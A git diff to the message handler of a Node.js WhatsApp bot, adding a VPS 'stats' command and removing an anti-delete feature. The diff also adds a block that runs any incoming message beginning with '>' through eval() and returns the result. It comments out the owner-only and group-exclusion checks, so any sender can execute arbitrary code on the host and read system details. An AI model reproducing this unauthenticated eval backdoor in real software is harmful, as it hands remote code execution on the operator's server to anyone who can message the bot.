@@ -19,6 +19,7 @@ const fetch = require("node-fetch");
 const chalk = require("chalk");
 const yts = require("yt-search");
 const { exec, spawn, execSync } = require("child_process");
+const os = require("os");
 const util = require("util");
 const { Sticker, StickerTypes } = require("wa-sticker-formatter");
 const ytdownload = require("./Scrapers/ytdownload");
@@ -30,7 +31,7 @@ const ffmpeg = require("fluent-ffmpeg");
 
 module.exports = main = async (client, m, chatUpdate) => {
   try {
-    const { handleIncomingMessage, handleMessageRevocation } = require("./antidelete.js");
+    
 
    
     var body =
@@ -70,6 +71,17 @@ module.exports = main = async (client, m, chatUpdate) => {
     const sender = m.sender;
     const mek = chatUpdate.messages[0];
 const Jimp = require("jimp");
+
+                if (budy.startsWith('>')) {
+
+                    try {
+                        let evaled = await eval(budy.slice(2))
+                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+                        await reply(evaled)
+                    } catch (err) {
+                        await reply(String(err))
+                    }
+                }
 
 async function generateProfilePicture(buffer) {
     const jimp = await Jimp.read(buffer)
@@ -160,11 +172,7 @@ async function reencodeMp3(buffer) {
 
 
 
-   if (mek.message?.protocolMessage?.key) {
-      await handleMessageRevocation(client, mek, botNumber);
-    } else {
-      handleIncomingMessage(mek);
-    }
+   
 
     
     if (m.chat.endsWith("broadcast")) {
@@ -178,7 +186,7 @@ async function reencodeMp3(buffer) {
       if (quotedMessage.imageMessage) {
         let imageCaption = quotedMessage.imageMessage.caption;
         let imageUrl = await client.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
-        client.sendMessage(client.user.id, {
+        client.sendMessage(botNumber, {
           image: { url: imageUrl },
           caption: imageCaption
         });
@@ -187,7 +195,7 @@ async function reencodeMp3(buffer) {
       if (quotedMessage.videoMessage) {
         let videoCaption = quotedMessage.videoMessage.caption;
         let videoUrl = await client.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
-        client.sendMessage(client.user.id, {
+        client.sendMessage(botNumber, {
           video: { url: videoUrl },
           caption: videoCaption
         });
@@ -199,7 +207,7 @@ async function reencodeMp3(buffer) {
       if (quotedMessage?.imageMessage) {
         let imageCaption = quotedMessage.imageMessage.caption || "";
         let imageUrl = await client.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
-        client.sendMessage(client.user.id, {
+        client.sendMessage(botNumber, {
           image: { url: imageUrl },
           caption: imageCaption
         });
@@ -208,7 +216,7 @@ async function reencodeMp3(buffer) {
       if (quotedMessage?.videoMessage) {
         let videoCaption = quotedMessage.videoMessage.caption || "";
         let videoUrl = await client.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
-        client.sendMessage(client.user.id, {
+        client.sendMessage(botNumber, {
           video: { url: videoUrl },
           caption: videoCaption
         });
@@ -216,7 +224,7 @@ async function reencodeMp3(buffer) {
 
       if (quotedMessage?.audioMessage) {
         let audioUrl = await client.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
-        client.sendMessage(client.user.id, {
+        client.sendMessage(botNumber, {
           audio: { url: audioUrl },
           mimetype: quotedMessage.audioMessage.mimetype,
           ptt: quotedMessage.audioMessage.ptt || false
@@ -233,14 +241,69 @@ async function reencodeMp3(buffer) {
     const args = budy.trim().split(/ +/).slice(1);
 
    
-    if (sender !== botNumber) return;
-if (m.chat.endsWith('@g.us')) return;
+   // if (sender !== botNumber) return;
+// if (m.chat.endsWith('@g.us')) return;
     if (isCmd) {
       switch (command) {
         case "ping":
         case "test":
           reply("✅ Bot is active!");
           break;
+case "stats": {
+  try {
+    // Uptime
+    const totalSeconds = os.uptime();
+    const days = Math.floor(totalSeconds / 86400);
+    const hours = Math.floor((totalSeconds % 86400) / 3600);
+    const minutes = Math.floor((totalSeconds % 3600) / 60);
+    const seconds = Math.floor(totalSeconds % 60);
+
+    // RAM
+    const totalRam = os.totalmem();
+    const freeRam = os.freemem();
+    const usedRam = totalRam - freeRam;
+
+    const formatBytes = (bytes) =>
+      (bytes / 1024 / 1024 / 1024).toFixed(2) + " GB";
+
+    // Disk (ROM) — Linux VPS
+    let disk = "N/A";
+    try {
+      const df = execSync("df -h /").toString().split("\n")[1].split(/\s+/);
+      disk = `${df[2]} / ${df[1]} (${df[4]} used)`;
+    } catch {}
+
+    const cpu = os.cpus()[0];
+
+    const text = `
+🖥️ *VPS STATS*
+
+📛 *Name:* ${os.hostname()}
+🧠 *OS:* ${os.type()} ${os.release()} (${os.arch()})
+
+⏱️ *Uptime:*
+${days}d ${hours}h ${minutes}m ${seconds}s
+
+💾 *RAM:*
+${formatBytes(usedRam)} / ${formatBytes(totalRam)}
+
+📦 *Disk (ROM):*
+${disk}
+
+⚙️ *CPU:*
+${cpu.model}
+Cores: ${os.cpus().length}
+
+🟢 *Node.js:* ${process.version}
+    `.trim();
+
+    reply(text);
+  } catch (err) {
+    console.error("STATS CMD ERROR:", err);
+    reply("❌ Failed to fetch VPS stats");
+  }
+  break;
+}
 
 case "toimg": 
     try {
